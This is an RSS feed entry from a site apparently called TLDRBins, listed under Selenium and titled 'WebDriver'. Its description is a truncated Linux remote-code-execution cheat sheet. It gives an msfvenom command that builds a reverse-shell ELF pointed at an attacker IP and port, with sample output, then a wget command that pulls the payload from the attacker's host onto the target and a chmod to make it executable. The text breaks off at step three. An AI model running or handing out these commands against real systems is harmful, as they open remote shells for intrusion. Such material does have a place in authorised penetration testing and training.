channel.title: Selenium on TLDRBins
channel.description: Recent content in Selenium on TLDRBins

item.title: WebDriver
item.description: Linux Privesc #1: RCE 1. Create a Payload msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> -f elf > rev $ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.0.1 LPORT=1337 -f elf > rev [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 74 bytes Final size of elf file: 194 bytes 2. Upload to Target wget http://<LOCAL_IP>/rev -o /tmp/rev # Chmod chmod 755 /tmp/rev 3.
